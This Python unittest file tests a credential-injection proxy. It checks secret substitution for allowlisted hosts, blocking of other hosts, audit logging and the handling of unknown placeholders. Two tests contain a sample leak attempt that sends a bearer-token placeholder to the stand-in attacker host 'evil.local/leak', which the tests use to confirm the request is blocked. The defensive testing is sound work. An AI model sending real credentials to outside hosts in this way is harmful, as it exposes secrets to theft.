"""Tests for the credential injection proxy.

Spin up a tiny localhost HTTP server in a thread; verify that:
  - allowed hosts go through and get their ${...} placeholders substituted
  - off-allowlist hosts are blocked before any substitution happens
  - the audit log records every attempt
  - unknown placeholders are left intact (not silently dropped)
"""

from __future__ import annotations

import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

from claude_demo.proxy.credential import CredentialProxy


class _RecordingHandler(BaseHTTPRequestHandler):
    """Record the request line, headers, and body so tests can inspect them."""

    received: list[dict] = []

    def log_message(self, fmt: str, *args) -> None:  # quiet
        return

    def _record(self, method: str) -> None:
        length = int(self.headers.get("Content-Length", "0") or "0")
        body = self.rfile.read(length).decode("utf-8") if length else ""
        type(self).received.append(
            {
                "method": method,
                "path": self.path,
                "headers": {k: v for k, v in self.headers.items()},
                "body": body,
            }
        )
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        body_out = b'{"ok": true}'
        self.send_header("Content-Length", str(len(body_out)))
        self.end_headers()
        self.wfile.write(body_out)

    def do_GET(self) -> None:  # noqa: N802
        self._record("GET")

    def do_POST(self) -> None:  # noqa: N802
        self._record("POST")


class TestCredentialProxy(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        _RecordingHandler.received = []
        cls.server = HTTPServer(("127.0.0.1", 0), _RecordingHandler)
        cls.port = cls.server.server_address[1]
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls) -> None:
        cls.server.shutdown()
        cls.server.server_close()
        cls.thread.join(timeout=2)

    def setUp(self) -> None:
        _RecordingHandler.received.clear()

    def _proxy(self) -> CredentialProxy:
        return CredentialProxy(
            allowed_hosts={"api.local"},
            secrets={"TOKEN": "real-secret-value", "OTHER": "other-value"},
            host_overrides={"api.local": ("127.0.0.1", self.port)},
            timeout_seconds=2.0,
        )

    def test_allowed_host_substitutes_header(self) -> None:
        proxy = self._proxy()
        result = proxy.request(
            method="GET",
            url="http://api.local/path",
            headers={"Authorization": "Bearer ${TOKEN}"},
        )
        self.assertFalse(result.blocked)
        self.assertEqual(result.status, 200)
        self.assertIn("TOKEN", result.substitutions)

        # The mock server saw the SUBSTITUTED value.
        recorded = _RecordingHandler.received[-1]
        self.assertEqual(recorded["headers"].get("Authorization"), "Bearer real-secret-value")
        # And the logical Host name was preserved.
        self.assertEqual(recorded["headers"].get("Host"), "api.local")

    def test_allowed_host_substitutes_body(self) -> None:
        proxy = self._proxy()
        result = proxy.request(
            method="POST",
            url="http://api.local/path",
            headers={"Content-Type": "application/json"},
            body='{"k": "${TOKEN}", "other": "${OTHER}"}',
        )
        self.assertFalse(result.blocked)
        self.assertEqual(result.status, 200)
        self.assertEqual(sorted(result.substitutions), ["OTHER", "TOKEN"])
        recorded = _RecordingHandler.received[-1]
        self.assertIn("real-secret-value", recorded["body"])
        self.assertIn("other-value", recorded["body"])

    def test_blocked_host_never_substitutes(self) -> None:
        proxy = self._proxy()
        result = proxy.request(
            method="GET",
            url="http://evil.local/leak",
            headers={"Authorization": "Bearer ${TOKEN}"},
        )
        self.assertTrue(result.blocked)
        self.assertEqual(result.status, 0)
        self.assertEqual(result.substitutions, [])
        # The mock server must not have received this request at all.
        self.assertEqual(_RecordingHandler.received, [])

    def test_audit_log_captures_both_outcomes(self) -> None:
        proxy = self._proxy()
        proxy.request(method="GET", url="http://api.local/ok", headers={"Authorization": "Bearer ${TOKEN}"})
        proxy.request(method="GET", url="http://evil.local/leak")
        self.assertEqual(len(proxy.audit_log), 2)
        self.assertFalse(proxy.audit_log[0].blocked)
        self.assertEqual(proxy.audit_log[0].secrets_used, ["TOKEN"])
        self.assertTrue(proxy.audit_log[1].blocked)
        self.assertIn("evil.local", proxy.audit_log[1].block_reason)

    def test_unknown_placeholder_left_alone(self) -> None:
        proxy = self._proxy()
        result = proxy.request(
            method="GET",
            url="http://api.local/path",
            headers={"X-Marker": "value=${UNKNOWN_NAME}"},
        )
        # Server must see the placeholder verbatim, not an empty string —
        # silent drops would mask config bugs.
        recorded = _RecordingHandler.received[-1]
        self.assertEqual(recorded["headers"].get("X-Marker"), "value=${UNKNOWN_NAME}")
        self.assertNotIn("UNKNOWN_NAME", result.substitutions)


if __name__ == "__main__":
    unittest.main()
